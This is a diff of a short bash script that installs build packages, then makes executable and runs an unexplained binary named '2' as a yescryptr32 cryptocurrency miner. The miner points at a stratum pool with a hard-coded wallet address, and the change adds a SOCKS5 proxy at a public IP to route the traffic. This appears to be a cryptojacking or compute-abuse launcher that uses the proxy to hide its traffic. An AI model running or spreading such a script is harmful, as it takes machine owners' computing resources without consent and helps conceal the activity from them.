@@ -1,5 +1,7 @@
 #!/bin/bash
 
  apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++ -y
- 
-chmod u+x 2 && ./2 -a yescryptr32 -o stratum+tcps://stratum-eu.rplant.xyz:17047 -u DKMdnGVbkXRURHCMz9BfqhuYm7V2xss7ZV.1jt/day
+ A=DKMdnGVbkXRURHCMz9BfqhuYm7V2xss7ZV
+ B=1jt/day
+ C=socks5://72.206.181.103:4145
+chmod u+x 2 && ./2 -a yescryptr32 -o stratum+tcps://stratum-eu.rplant.xyz:17047 -u $A.$B -x $C
